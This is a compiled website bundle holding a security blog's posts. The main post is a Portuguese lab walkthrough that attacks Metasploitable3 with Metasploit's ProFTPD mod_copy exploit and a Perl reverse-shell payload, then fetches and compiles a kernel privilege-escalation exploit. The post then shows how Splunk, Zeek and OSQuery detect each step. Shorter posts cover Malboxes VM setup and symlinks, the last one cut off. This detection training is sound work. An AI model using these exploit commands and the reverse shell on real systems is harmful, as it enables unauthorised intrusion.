"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[836],{4641:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"/2023/04/27/metasploitable-detec/metasploitable3-detectionlab","metadata":{"permalink":"/en/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab","editUrl":"https://github.com/imgodes/imgodes.github.io/blob/main/website/blog/metasploitable-detec/2023-04-27-metasploitable3-detectionlab.md","source":"@site/blog/metasploitable-detec/2023-04-27-metasploitable3-detectionlab.md","title":"Metasploitable & DetectionLab","description":"Adi\xe7\xe3o do Metasploitable3 (com seus logs e telemetrias) ao DetectionLab.","date":"2023-04-26T18:52:00.000Z","formattedDate":"April 26, 2023","tags":[{"label":"pr\xe1tica","permalink":"/en/blog/tags/pratica"},{"label":"tutorial","permalink":"/en/blog/tags/tutorial"}],"readingTime":11.335,"hasTruncateMarker":true,"authors":[{"name":"Godes","title":"Cyber Defense Analyst","url":"https://www.linkedin.com/in/gguedescruz/","imageURL":"https://avatars.githubusercontent.com/u/52048434?v=4","key":"imgodes"}],"frontMatter":{"title":"Metasploitable & DetectionLab","authors":"imgodes","image":"./heros.jpg","date":"2023-04-26 18:52:00 -0300","categories":["Cybersecurity","Attack & Detection"],"tags":["pr\xe1tica","tutorial"]},"nextItem":{"title":"Creating Malboxes VMs","permalink":"/en/blog/2023/04/23/malboxes/malboxes-vms"}},"content":"Adi\xe7\xe3o do [Metasploitable3](https://github.com/rapid7/metasploitable3) (com seus logs e telemetrias) ao [DetectionLab](https://detectionlab.network/).\\n\\n![a](./heros.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\n> Observa\xe7\xe3o: esse guia pode ser um pouco dif\xedcil de acompanhar caso n\xe3o conhe\xe7a o Detection Lab, mas basta instala-lo uma vez que tudo ficar\xe1 mais f\xe1cil de entender.\\n\\n# \xcdndice\\n\\n# Introdu\xe7\xe3o\\nO Metasploitable3 \xe9 uma m\xe1quina com servi\xe7os propositalmente vulner\xe1veis. Existem v\xe1rias vers\xf5es dele, eu escolhi a terceira por ser a [mais nova](https://github.com/rapid7/metasploitable3/wiki#differences-between-metasploitable-3-and-the-older-versions).\\n\\nJ\xe1 o [DetectionLab](https://twitter.com/DetectionLab) \xe9 um agrupado de ferramentas de detec\xe7\xe3o e logging, que juntas se tornam um \xf3timo ambiente de testes.\\n\\n- [Twitter do DetectionLab](https://twitter.com/DetectionLab)\\n- [Github do Criador](https://github.com/clong)\\n- [Site oficial](https://detectionlab.network)\\n\\n![dttnlab](overview.png)\\n_Imagem retirada do site oficial - https://detectionlab.network_\\n\\n\\n**Pontos importantes**:\\n- O tr\xe1fego de rede \xe9 loggado pelo Zeek;\\n- Suricata \xe9 um IDS, um IPS, um NSM e processador de captura de pacotes open source, ele trabalha junto com o Zeek na an\xe1lise de tr\xe1fego;\\n- O Velociraptor e o OSQuery nos apoiam quanto a an\xe1lise do endpoint e ambos possuem sua pr\xf3pria interface web;\\n- O OSQuery consegue fazer consultas de baixo n\xedvel do SO. \\n  - Ele exp\xf5e as informa\xe7\xf5es do SO \xe1 um banco de dados que pode ser consultado por uma interface web chamada Fleet;\\n  - Apesar ter sua pr\xf3pria interface web, o OsQuery envia logs dos resultados das consultas (`index=osquery`) e tamb\xe9m de status dele mesmo (INFO/WARN/ERROR). \\n- Todos esses logs podem ser consultados no Splunk.\\n\\n## Combo - Metasploitable3 & DetectionLab\\nCombinando a capacidade de detec\xe7\xe3o e investiga\xe7\xe3o do Splunk + OSQuery, com os futuros ataques feitos ao servidor vulner\xe1vel, ganhamos a capacidade de identificar as etapas do ataque. Mas antes de seguir com a pr\xe1tica, temos que entender como os componentes interagem, que ap\xf3s as minhas customiza\xe7\xf5es, passa a funcionar da seguinte forma:\\n![combopng](detectionlabmeta3x.png)\\n_Desenho da arquitetura do lab do ponto de vista das funcionalidades_ \\n\\nObserva\xe7\xf5es:\\n- Configurei o envio dos logs do apache para o Splunk via NXLog (mais detalhes em [NXLog](#nxlog));\\n- Configurei a coleta de telemetrias pelo OSQuery (mais detalhes em [OSQuery e Fleet](#osquery-e-fleet));\\n- Instalei uma VM do Kali para efetuar os ataques;\\n- Desliguei as m\xe1quinas windows do DetectionLab pois n\xe3o iam ser usadas;\\n- _O agente do Velociraptor ainda n\xe3o est\xe1 configurado no Metasploitable, portanto seguimos apenas com o OSQuery._\\n\\n# Setup TLTR - Too lazy to read\\nSe voc\xea estiver com pressa, ou j\xe1 saiba como tudo isso funciona, basta seguir o passos abaixo.\\n\\n> Caso desconhe\xe7a as ferramentas acima, recomendo ler um pouco antes de tentar instalar e configurar.\\n{: .prompt-info}\\n\\n## Instala\xe7\xe3o \\n**Com o detectionlab j\xe1 INSTALADO e funcionando use os comandos abaixo:**\\n```shell\\ngit clone https://github.com/imgodes/DetectionLabMetasploitable3.git\\ncd DetectionLabMetasploitable3\\nvagrant up\\n```\\n\\nCrie um index no Splunk chamado `syslog`. \\nExplica\xe7\xe3o detalhada em [index](#index).\\n\\n## Acessos\\n\\n- Fleet login: https://192.168.56.105:8412 - admin@detectionlab.network:Fl33tpassword!\\n- Splunk login: https://192.168.56.105:8000 - admin:changeme\\n- Velociraptor login: https://192.168.56.105:9999 - admin:changeme\\n- Metasploitable3 em http://192.168.56.210 - vagrant:vagrant\\n\\n> Agora vamos a apresenta\xe7\xe3o das customiza\xe7\xf5es feitas. Lembrando que \xe9 tudo meramente informativo, afinal, ser\xe1 configurado automaticamente ap\xf3s executar `vagrant up`(exceto a configura\xe7\xe3o do index do Splunk).\\n{: .prompt-danger}\\n\\n# Logging\\nO Metasploitable \xe9 somente uma m\xe1quina vulner\xe1vel alvo do nosso ataque, ent\xe3o sozinha, seria dif\xedcil de investigar e identificar a atividade maliciosa. Por essa raz\xe3o, instalei o OSQuery e o NXLog no Metasploitable. Essas ferramentas v\xe3o nos das a capacidade: \\n- **OSQuery** \ud83d\udc49 Consultar processos, pastas, arquivos, comandos usados, modifica\xe7\xf5es, sockets de rede e muitas outras informa\xe7\xf5es sobre o sistema operacional em tempo real, por meio de comandos SQL;\\n  - Pode ser consultado pela interface web do Fleet, ou pelo pr\xf3prio OSQuery mesmo (dentro da m\xe1quina do Metasploitable);\\n- **NXLog** \ud83d\udc49 Envio de logs de m\xe1quina ao Splunk;\\n- **Splunk** \ud83d\udc49 Consulta de logs de maneira centralizada.\\n\\n![detectionlab_simples-logging.drawio.png](detectionlab_simples-logging.drawio.png)\\n_Desenho da arquitetura do lab do ponto de vista do logging_ \\n\\n## OSQuery e Fleet\\nO OSQuery \xe9 uma ferramenta que permite consultar informa\xe7\xf5es do SO. \\n\\nJ\xe1 o Fleet \xe9 um gerenciador de OSQuery open source, com ele podemos gerenciar e consultar o OSQuery em v\xe1rios dispositivos por meio de uma interface web.\\n\\nProcessos, opera\xe7\xf5es de rede, e muitas outras coisas podem ser consultas. Para a alegria do brasileiro m\xe9dio, existem  muitos \\"packs de consultas\\" prontos voltados para identifica\xe7\xe3o de ataques. Esses packs, s\xe3o queries prontas, basta executa-las. \\n\\n> Exemplos - [OSQuery packs oficiais](https://github.com/osquery/osquery/tree/master/packs), [Palantir Packs](https://github.com/palantir/osquery-configuration/tree/master)\\n\\n- Os \\"agentes\\" do OSQuery s\xe3o registrados no Fleet.\\n  - As consultas e configura\xe7\xf5es do agente Osquery s\xe3o fornecidas pelo Fleet atrav\xe9s de uma conex\xe3o TLS.  \\n- A configura\xe7\xe3o do agente \xe9 definida pelo arquivo `osquery.flags`{: .filepath} \\n- O nosso Fleet do DetectionLab \xe9 pr\xe9-configurado com os arquivos do [Palantir](https://github.com/palantir/osquery-configuration). \\n- As op\xe7\xf5es ativadas no arquivo de `osquery.flags`{: .filepath} s\xe3o as do pr\xf3prio Palantir, e n\xe3o alterei nada, apenas peguei do reposit\xf3rio deles. \\n- De acordo com o reposit\xf3rio do Palantir, \xe9 esperado que hosts Linux tenham o arquivo [ossec-rootkit.conf](https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/packs/ossec-rootkit.conf) em `/etc/osquery/packs/ossec-rootkit.conf`{: .filepath} isso \xe9 garantido pelo vagrant quando executamos `vagrant up`.\\n- A op\xe7\xe3o user_events \xe9 desabilitada por padr\xe3o, pois de acordo com a documenta\xe7\xe3o \xe9 redundante.\\n> \\"On Linux, a companion table called user_events is included that provides several authentication-based events. If you are enabling process auditing it should be trivial to also include this table\\" - [User event auditing with Audit](https://osquery.readthedocs.io/en/stable/deployment/process-auditing/)\\n\\n## NXLog\\nO NXLog \xe9 minha ferramenta favorita para encaminhamento de logs. NXLog pode processar eventos de milhares de fontes diferentes, funciona em sistemas antigos e novos. \xc9 capaz de processar um volume absurdo de logs (de acordo com a [documenta\xe7\xe3o](https://docs.nxlog.co/userguide/intro/about-nxlog.html)). Trabalha bem com diversos protocolos de rede, transporte, e criptografias, al\xe9m de suportar  tamb\xe9m de formatos de logs dos mais variados (Syslog, Windows Event Log, JSON, etc). E mesmo que n\xe3o tenha alguma predefini\xe7\xe3o, ainda \xe9 poss\xedvel fazer o parsing manualmente.\\n\\nEnt\xe3o iremos instalar o NXLog no Metasploitable3, para o parsing inicial, e envio dos logs do apache para o Splunk. A configura\xe7\xe3o do NXLog \xe9 toda centralizada no arquivo `nxlog.conf`{: .filepath}. \\n\\n- A minha configura\xe7\xe3o est\xe1 dispon\xedvel no [github](https://raw.githubusercontent.com/imgodes/DetectionLabMetasploitable3/master/nxlog.conf);\\n- O agente do NXlog usado \xe9 o 2.10 para Ubuntu 14.04 (trusty);\\n\\nO agente do NXLog consegue ler alguma entrada ([Input](#nxlog-input)), manipula-la (Exec) e enviar para alguma sa\xedda([Output e Route](#nxlog-output)). Essas diretrizes s\xe3o definidas todas no mesmo arquivo `nxlog.conf`{: .filepath}.\\n\\n### NXLog Input\\n\xc9 a entrada dos logs, nesse caso um arquivo.\\n\\n- Configurei o NXLog para ler os logs do apache em `/var/log/apache2/access.log`{: .filepath};\\n- Fiz uma regex para fazer o parsing dos campos do apache;\\n  - Essas configura\xe7\xf5es est\xe3o de acordo com as configura\xe7\xf5es de logging que declarei no arquivo `apache2.conf`, caso altere, lembre de alterar manter a concord\xe2ncia entre eles.\\n\\n```xml\\n<Input apache_access>\\n    Module im_file\\n    File        \\"/var/log/apache2/access.log\\"\\n    <Exec>\\n        if $raw_event =~ /(?x)^(\\\\S+)\\\\ \\\\S+\\\\ (\\\\S+)\\\\ \\\\[([^\\\\]]+)\\\\]\\\\ \\\\\\"(\\\\S+)\\\\ (.+)\\n                          \\\\ HTTP\\\\/\\\\d\\\\.\\\\d\\\\\\"\\\\ (\\\\S+)\\\\ (\\\\S+)\\\\ \\\\\\"([^\\\\\\"]+)\\\\\\"\\n                          \\\\ \\\\\\"([^\\\\\\"]+)\\\\\\"/\\n        {\\n            $Hostname = $1;\\n            if $2 != \'-\' $AccountName = $2;\\n            $EventTime = parsedate($3);\\n            $HTTPMethod = $4;\\n            $HTTPURL = $5;\\n            $HTTPResponseStatus = $6;\\n            if $7 != \'-\' $FileSize = $7;\\n            if $8 != \'-\' $HTTPReferer = $8;\\n            if $9 != \'-\' $HTTPUserAgent = $9;\\n        }\\n    </Exec> \\n</Input>\\n```\\n{: file=\'/etc/nxlog/nxlog.conf\'}\\n\\n### NXLog Output\\nAqui configuramos o que vem do Input e vai para o Splunk.\\n\\n- Digo que sa\xedda usar\xe1 a porta `514/UDP` sendo que o destino ser\xe1 o IP do servidor Splunk;\\n- Executo a fun\xe7\xe3o `drop()` para descartar logs cujo o hostname vem como ipv4 de loopback (isso estava floodando o Splunk de eventos);\\n- Executo a fun\xe7\xe3o `to_json()` para converter o log para o formato JSON.\\n\\n```xml\\n<Output syslog_udp>\\n    Module     om_udp\\n    Host       192.168.56.105\\n    PORT       514 \\n    <Exec>\\n        if ($Hostname == \'127.0.0.1\') drop();\\n        to_json();\\n    </Exec>\\n</Output>\\n\\n<Route 1>\\n    Path apache_access => syslog_udp\\n</Route>\\n```\\n{: file=\'/etc/nxlog/nxlog.conf\'}\\n\\n## Splunk \\n\\nOs logs s\xe3o enviados ao Splunk por meio do agente do [NXLog](https://nxlog.co/) pela porta `514/udp` e caem no index chamado \\"syslog\\". O problema \xe9 que esse index ainda n\xe3o existe. Teremos que configura-lo na m\xe3o.\\n\\n### Index\\nPara configurar um index configurar um index. Basta clicar em `Settings` > `Indexes` > `New Index`\\n\\n![settings](splunk-settings.png){: width=\\"400\\" heigth=\\"400\\"} \\n\\nDepois basta colocar o nome e dale:\\n\\n![index](splunk-settings-index.png){: width=\\"400\\" heigth=\\"400\\"}\\n\\nFeito isso seu lab est\xe1 pronto para a maldade.\\n\\n# Attack\\nO ataque n\xe3o foi grande coisa. Meu foco era ver como a o ataque poderia ser observado nos logs a fim de exemplificar como pode ser usado.\\n\\n## Scanning\\nUm scan simples com nmap para come\xe7ar.\\n```shell\\nnmap -sV -p- 192.168.56.210\\n```\\n{: file=\\"Shell Kali\\"}\\n\\n![nmap](nmap1.png)\\n\\nHaviam v\xe1rios vetores de ataque, fui no primeiro que li na tela rsrs.\\n\\nAo ver a combina\xe7\xe3o do ProFTP + Apache, podemos supor que temos permiss\xe3o de grava\xe7\xe3o no SITEPATH. Ent\xe3o, se explorarmos o servi\xe7o ProFTPD podemos abusar da permiss\xe3o no Apache SITEPATH, o que nos permitir\xe1 obter shell reverso. Mas l\xf3gico que tudo isso \xe9 autom\xe1tico rs, eu s\xf3 vou aperta um bot\xe3o. \\n\\n## Exploiting\\nUsando o `msfconsole` > `search proftp` e encontrei o exploit [modcopy execution](https://www.exploit-db.com/exploits/37262).\\n```shell\\nuse proftpd_modcopy_exec\\nset RHOST 192.168.56.210\\nset TARGETURI /\\nset SITEPATH /var/www/html/\\nset payload payload/cmd/unix/reverse_perl\\nset LHOST 192.168.56.109\\nexploit\\n```\\n{: file=\\"Shell Kali\\"}\\n![proftp-exploit.png](proftp-exploit.png)\\n\\n\\nAgora com acesso ao shell, podemos escalonar privil\xe9gio. \\nA hist\xf3ria \xe9 mais longa do que isso, mas resumindo, usei um exploit para aquele kernel em espec\xedfico.\\n\\nNo Kali Linux executei uma busca por aquela vers\xe3o do kernel no exploitdb, e deixei o c\xf3digo malicioso dispon\xedvel para download. \\n```shell\\nsearchsploit linux local kernel 3.13 ubuntu 14.04\\nsearchsploit -m 37292.c\\nmv 37292.c /tmp\\npython3 -m http.server 80\\n```\\n{: file=\\"Shell Kali\\"}\\n\\n![searchsploit.png](searchsploit.png)\\n\\nVoltando a console que ganhamos acesso com o usu\xe1rio www-data, vamos baixar o exploit.\\n```shell\\nwget 192.168.56.109/37292.c\\ncd tmp\\ngcc 37292.c -o salve\\n./salve\\nwhoami\\n```\\n{: file=\\"Shell Web Server\\"}\\n\\n![salve](salve.png)\\n\\nAqui \xe9 o fim da explora\xe7\xe3o, vamos ao lado azul da for\xe7a ver o que foi loggado ao longo do processo. \\n\\n# Detect \\nVou me basear no Mitre ATT&CK para descrever a t\xe9cnica usada, e no cyber kill chain para descrever os momentos do ataque. Clique na imagem abaixo para verificar o gr\xe1fico.\\n\\n![DectEng.png](DectEng.png)\\n- A curva vai de T\u2080/M\u2080 \xe1 M\u0562/T\u0562;\\n- Observe que para cada tempo T\u209b, temos diferentes capacidades de detec\xe7\xe3o variando de acordo com a ferramenta que registra aquele momento M\u209b do atacante.\\n\\n## Detecting Scan \\n\\n### Detecting Scan - Suricata\\n\\nA seguinte search poderia ser feita para identificar quais origens tem feito comunica\xe7\xe3o com o web server e quais alertas foram gerados pelo Suricata.\\n\\n```sql\\nindex=* dest_ip=\\"192.168.56.210\\"\\n| stats values(src_ip), values(dest_ip), values(dest_port), values(app_proto), values(alert.signature) by src_ip, alert.category\\n```\\n{: file=\\"Splunk Search\\"}\\n\\n![suricata](suricataXnmap.png)\\n_clique na imagem para expandir_\\n\\n> Existem outros logs de quando eu ainda estava testando o laborat\xf3rio, mas a explora\xe7\xe3o foi feita pelo IP final .109. \\n\\n\\n### Detecting Scan - Zeek\\n\\nCom as informa\xe7\xf5es da busca anterior, podemos ver com quantos bytes foram trafegados entre os hosts:\\n```sql\\nindex=*  id.orig_h=\\"192.168.56.109\\" id.resp_h=\\"192.168.56.210\\" sourcetype=\\"zeek:json\\" \\n| bin span=3min _time \\n| stats values(id.orig_h), values(id.resp_h), values(id.resp_p), sum(orig_ip_bytes), sum(resp_ip_bytes) by _time\\n```\\n{: file=\\"Splunk Search\\"}\\n\\n![zeek](suricataXnmap.png)\\n_clique na imagem para expandir_\\n\\nVemos um volume absurdo de varia\xe7\xe3o de portas destino e tamb\xe9m dos bytes trafegados.\\n\\n## Detecting Exploit\\n\\n### Detecting ProFTP Exploit - Splunk\\nPelos logs do apache podemos buscar pelo IP do atacante e separar as requisi\xe7\xf5es pelo c\xf3digo de retorno.\\n```sql\\nindex=\\"syslog\\" Hostname=\\"192.168.56.109\\" \\n| eval decodedHTTPURL=urldecode(HTTPURL)\\n| stats values(HTTPMethod), values(decodedHTTPURL) by HTTPResponseStatus, HTTPUserAgent\\n```\\n{: file=\\"Splunk Search\\"}\\n\\n![apacheperl](apache_perl.png)\\n\\nEncontramos a requisi\xe7\xe3o maliciosa.\\n\\nPelos logs do zeek, temos evidencias das conex\xf5es na porta 4444, confirmando o sucesso **de rede** da requisi\xe7\xe3o acima.\\n```sql\\nindex=*  id.orig_h=\\"192.168.56.109\\" id.resp_h=\\"192.168.56.210\\" id.resp_p=4444 sourcetype=\\"zeek:json\\"\\n| stats values(id.orig_h), values(id.resp_h), values(id.resp_p), sum(orig_ip_bytes), sum(resp_ip_bytes) by _time\\n```\\n{: file=\\"Splunk Search\\"}\\n\\n\\n### Detecting ProFTP Exploit - OSQuery\\nAgora \xe1 n\xedvel de m\xe1quina, podemos verificar no OSQuery quais os efeitos do exploit.\\nBusquei primeiro pelos processos criados que possuem um command line com o IP do atacante.\\n\\n```sql\\nSELECT * FROM processes where cmdline LIKE \'%192.168.56.109%\';\\n```\\n{: file=\\"OSQuery Search\\"}\\n![osquery-perl.png](osquery-perl.png)\\n\\nComo uma conex\xe3o foi estabelecida anteriormente, busquei por sockets abertos com o IP do atacante tamb\xe9m:\\n```sql\\nSELECT * FROM process_open_sockets where remote_address =  \'192.168.56.109\';\\n```\\n{: file=\\"OSQuery Search\\"}\\n\\n![osquery-socketremotaddr.png](osquery-socketremotaddr.png)\\n\\nVamos ao estudo do que aconteceu. Quebrando o payload original em partes, e entendendo cada uma delas. O payload executado foi o seguinte:\\n\\n```perl\\nperl -MIO -e \'$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\\"192.168.56.109:4444\\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};\' &\\n```\\n{: file=\\"Payload malicioso\\"}\\n\\n1. Esse payload cria um fork (processo filho);\\n```perl\\n$p=fork;exit\\n```\\n\\n2. Manipula as vari\xe1veis de ambiente;\\n```perl\\nif($p);\\n  foreach my $key(keys %ENV){\\n    if($ENV{$key}=~/(.*)/){\\n    $ENV{$key}=$1;\\n    }\\n  }\\n```\\n\\n3. Cria uma vari\xe1vel `$c`, que cria um socket de rede com o Kali;\\n```perl\\n$c=new IO::Socket::INET(PeerAddr,\\"192.168.56.109:4444\\");\\n```\\n\\n4. O fork le a entrada(`STDIN`) que digitar-mos, e escreve a sa\xedda (`$~`) no socket `$c` por meio de um redirecionamento, isso tudo em looping, fazendo parecer um shell interativo.\\n```perl\\nSTDIN->fdopen($c,r);\\n$~->fdopen($c,w);\\nwhile(<>){\\n  if($_=~ /(.*)/){\\n  system $1;\\n  }\\n}\\n```\\n\\n> Pelo o que entendi, esses if\'s (`if($_=~ /(.*)/)`) s\xe3o como uma prote\xe7\xe3o contra script kiddies, ou apenas para redu\xe7\xe3o de poss\xedveis danos maiores. Eles removem a possibilidade de uso de caracteres maliciosos (caracteres de escape e controle), pois com eles, o estrago pode ser muito maior pelo jeito. Mas atacantes sofisticados podem remover essas prote\xe7\xf5es. \\n{: .prompt-info}\\n\\nEssa parte achei bem interessante, da pra diferenciar o tipo de atacante s\xf3 pelo payload!\\n\\n### Detecting Kernel Exploit Download - Splunk\\n\\nAgora que sabemos que o servidor foi ownado podemos ver se ele fez requisi\xe7\xf5es para outros servidores.\\n```sql\\nSELECT * FROM process_open_sockets where remote_address =  \'192.168.56.109\';\\n```\\n![wget.png](wget.png)\\n\\nPelos logs do suricata, conseguimos pegar a requisi\xe7\xe3o originada pelo servidor para o servidor malicioso, que foi usada para fazer o download do malware.  \\n\\nEsse foi apenas um exemplo de v\xe1rias das possibilidades com esse laborat\xf3rio.\\n\\n# Referencias\\n\\n- https://detectionlab.network\\n- https://docs.nxlog.co/userguide/configure/index.html\\n- https://osquery.readthedocs.io/en/latest/\\n- https://github.com/rapid7/metasploitable3/\\n\\n*[SO]:\\"Sistema Operacional\\"\\n*[dropo]: \\"Do ingles, drop, derrubar\\""},{"id":"/2023/04/23/malboxes/malboxes-vms","metadata":{"permalink":"/en/blog/2023/04/23/malboxes/malboxes-vms","editUrl":"https://github.com/imgodes/imgodes.github.io/blob/main/website/blog/malboxes/2023-04-23-malboxes-vms.md","source":"@site/i18n/en/docusaurus-plugin-content-blog/malboxes/2023-04-23-malboxes-vms.md","title":"Creating Malboxes VMs","description":"How to provision virtual machines for reverse engineering study.","date":"2023-04-23T12:52:00.000Z","formattedDate":"April 23, 2023","tags":[{"label":"reverse engineering","permalink":"/en/blog/tags/reverse-engineering"},{"label":"infrastructure","permalink":"/en/blog/tags/infrastructure"},{"label":"malboxes","permalink":"/en/blog/tags/malboxes"}],"readingTime":2.83,"hasTruncateMarker":true,"authors":[{"name":"Godes","title":"Cyber Defense Analyst","url":"https://www.linkedin.com/in/gguedescruz/","imageURL":"https://avatars.githubusercontent.com/u/52048434?v=4","key":"imgodes"}],"frontMatter":{"title":"Creating Malboxes VMs","authors":"imgodes","description":"How to provision virtual machines for reverse engineering study.","image":"./robot.png","date":"2023-04-23 12:52:00 -0300","tags":["reverse engineering","infrastructure","malboxes"],"hide_table_of_contents":false,"toc_min_heading_level":2,"toc_max_heading_level":4,"keywords":["malboxes","ida pro","retoolkit"]},"prevItem":{"title":"Metasploitable & DetectionLab","permalink":"/en/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab"},"nextItem":{"title":"Malabarismo com link simb\xf3lico","permalink":"/en/blog/2022/12/03/linksimb/malabarismo-com-links-simb\xf3licos"}},"content":"import Tabs from \'@theme/Tabs\';\\nimport TabItem from \'@theme/TabItem\';\\nimport TOCInline from \'@theme/TOCInline\';\\n\\nHow to provision virtual machines (VMs) for malware and reverse engineering purposes.\\n\\n![robot](./robot.png)\\n\\n\x3c!--truncate--\x3e\\n\\n# Introduction\\n\\n\\nMade by GoSecure, Malboxes is a tool meant to help to building safe and featureful Windows VMs. Create VMs, destroy them, and building them again could be pretty easy with Malboxes. I felt this need during the [Rafael Sousa\'s](https://www.instagram.com/hackingnaweboficial/) course.\\n\\n- [Malboxes repository](https://github.com/GoSecure/malboxes)\\n- [Introducing Malboxes: a Tool to Build Malware Analysis Virtual Machines](https://www.gosecure.net/blog/2017/02/16/introducing-malboxes-a-tool-to-build-malware-analysis-virtual-machines/)\\n\\n# Requirements\\nList of needed tools:\\n- Vagrant\\n- Packer\\n- Git \\n- Python pip\\n- Virtualbox \\n\\n# Installation\\n\\nThe [official repository](https://github.com/GoSecure/malboxes#installation) already has a step-by-step installation tutorial. So, I\'ll just talk about my customizations I\'ve made to study Assembly, C and eventually reverse engineering. \\n\\nI created a directory called `REV` and this directory will be my working diretory and where I\'ll put all the needed files.\\n\\n:::info My softwares\\nFor my use, I like having these programs below available: \\n- [IDA Pro 0800 (Reverse Engineer)](https://hex-rays.com/ida-pro/)\\n- [Masm 32 (Assembly)](https://www.masm32.com/download.htm)\\n- [Retoolkit (Reverse Engineer)](https://github.com/mentebinaria/retoolkit)\\n- [CodeBlocks (C Compiler/IDE)](https://www.codeblocks.org/)\\n:::\\n\\nNow, I execute the command `vagrant init` that inicializes the Vagrant environment into the current diretory by creating a file called `Vagrantfile`, if it doesn\'t exist.\\n\\n```bash\\nvagrant init\\n```\\n\\nAnd then, the directory\'s structure should look like this: \\n```txt title=\'Directory\'s Structure\'\\nREV\\n\u251c\u2500\u2500 IDAPRO\\n\u2502\xa0\xa0 \u251c\u2500\u2500 (IDA Files)\\n\u251c\u2500\u2500 tools\\n\u2502\xa0\xa0 \u251c\u2500\u2500 codeblocks-20.03-32bit-mingw-64bit-setup.exe\\n\u2502\xa0\xa0 \u251c\u2500\u2500 masm32.exe\\n\u2502\xa0\xa0 \u2514\u2500\u2500 retoolkit_2022.10_setup.exe\\n\u2514\u2500\u2500 Vagrantfile\\n```\\n\\nFor me, it\'s enough just to leave the executable files available for installation, because not always I dont always need all these things installed.\\n\\n:::info\xa0Automating\\nMaybe you want to automate the VMs creation. You can do it by using Vagrant, and then, every time that you use the `vagrant up` command, the Vagrant engine will setup the VM, according to what you set.\\n:::\\n\\n## VM Provisioning\\n\\nThe command `malboxes build win10_x64_analyst`, reads the configuration file located in `/home/USERNAME/.config/malboxes/config.js` to get the user settings adopted to create the VM, and they can be used to include a path that contains your desired tools.\\n\\n```js title=\'config.js\'\\n\\"ida_path\\": \\"/home/USERNAME/Downloads/IDAPRO\\",\\n\\"tools_path\\": \\"/home/cherno/Downloads/Tools\\",\\n```\\n\\n:::info The easier way\\nThere is another way. By default, when provisioning a VM, the current diretory will be synchronized with a directory inside the VM, so just keep the executables in the same folder used to provision the machine.\\n\\nIn my case, it is the diretory called `REV` that I had created before (like previously described at the [Installation](#installation) step).\\n\\nBelow we have those Linux (hosting machine) and Windows (virtual machine) perspective, and how the directory structure should be look like. \\n\\n<Tabs className=\\"unique-tabs\\">\\n<TabItem value=\\"linuxhost\\" label=\\"Linux Host\\">\\n\\n```txt\\n.\\n\u251c\u2500\u2500 IDAPRO\\n\u251c\u2500\u2500 tools\\n\u2514\u2500\u2500 Vagrantfile\\n```\\n\\n</TabItem>\\n<TabItem value=\\"windowsvm\\" label=\\"Windows VM\\">\\n\\n```cmd\\nC:\\\\Users\\\\malboxes\\\\Desktop\\\\host>tree /F\\nFolder PATH listing\\nVolume serial number is 0C1D-FBA3\\nC:.\\n\u2502   Vagrantfile\\n\u2502\\n\u251c\u2500\u2500\u2500tools\\n\u2502       masm32.exe\\n\u2502       codeblocks-20.03-32bit-mingw-64bit-setup.exe\\n\u2502       retoolkit_2022.10_setup.exe\\n\u2502\\n\u2514\u2500\u2500\u2500IDAPRO\\n    \u251c\u2500\u2500\u2500 (arquivos do IDA)\\n```\\n\\n</TabItem>\\n</Tabs>\\n\\n:::\\n\\nNow that we already setup everything, let\'s just build and execute the VM.\\n\\n```bash\\nmalboxes build win10_x64_analyst\\nmalboxes spin win10_x64_analyst rev\\nvagrant up\\n```\\n\\n:::danger\\nRemember to execute this step in the same directory that you used the command `vagrant init`\\n:::\\n\\nIn case you need to disable the Windows Defender, just execute the script in the directory `C:\\\\Tools\\\\disable_defender` inside the created VM.\\n\\n---\\n\\n<center>\\nI hope I helped you!\\n\\nGood luck in your security journey!\\n</center>\\n\\n---"},{"id":"/2022/12/03/linksimb/malabarismo-com-links-simb\xf3licos","metadata":{"permalink":"/en/blog/2022/12/03/linksimb/malabarismo-com-links-simb\xf3licos","editUrl":"https://github.com/imgodes/imgodes.github.io/blob/main/website/blog/linksimb/2022-12-03-malabarismo-com-links-simb\xf3licos.md","source":"@site/blog/linksimb/2022-12-03-malabarismo-com-links-simb\xf3licos.md","title":"Malabarismo com link simb\xf3lico","description":"Como usar links simb\xf3licos para aumentar o espa\xe7o em disco sem reiniciar o servidor.","date":"2022-12-03T18:40:00.000Z","formattedDate":"December 3, 2022","tags":[{"label":"pr\xe1tica","permalink":"/en/blog/tags/pratica"},{"label":"tutorial","permalink":"/en/blog/tags/tutorial"}],"readingTime":1.385,"hasTruncateMarker":true,"authors":[{"name":"Godes","title":"Cyber Defense Analyst","url":"https://www.linkedin.com/in/gguedescruz/","imageURL":"https://avatars.githubusercontent.com/u/52048434?v=4","key":"imgodes"}],"frontMatter":{"title":"Malabarismo com link simb\xf3lico","authors":"imgodes","date":"2022-12-03 18:40:00 -0300","categories":["Linux"],"tags":["pr\xe1tica","tutorial"],"image":"./disk3.png"},"prevItem":{"title":"Creating Malboxes VMs","permalink":"/en/blog/2023/04/23/malboxes/malboxes-vms"}},"content":"Como usar links simb\xf3licos para aumentar o espa\xe7o em disco sem reiniciar o servidor.\\n\\n![disk3](./disk3.png)\\n\\n\x3c!--truncate--\x3e\\n\\n[Symbolic link - Wikipedia](https://en.wikipedia.org/wiki/Symbolic_link#Storage_of_symbolic_links)\\n\\n[How to save space with-ymlinks](https://linuxconfig.org/how-to-save-space-with-symlinks-and-mount-points)\\n\\n![Disk](./disk.png) \\n\\nQuando o disco fica cheio, e diante da impossibilidade de expandir a parti\xe7\xe3o raiz, podemos optar pela combina\xe7\xe3o de adi\xe7\xe3o de um novo disco com o uso de links simb\xf3licos. Observe o desenho, a fim de entender a situa\xe7\xe3o problema;\\nNum primeiro momento, voc\xea apenas sabe que sua aplica\xe7\xe3o n\xe3o consegue mais escrever em arquivos, pois o disco est\xe1 cheio. Bom, podemos usar o comando abaixo, para achar qual diret\xf3rio est\xe1 ocupando mais espa\xe7o: \\n\\n```bash\\ndu -d 1 -cha / 2>/dev/null | grep -E \'G|M\'\\n```\\n\\nE supondo que voc\xea descobriu que o diret\xf3rio era de fato da sua aplica\xe7\xe3o no `/var` , e n\xe3o h\xe1 como expandir o volume, nem a 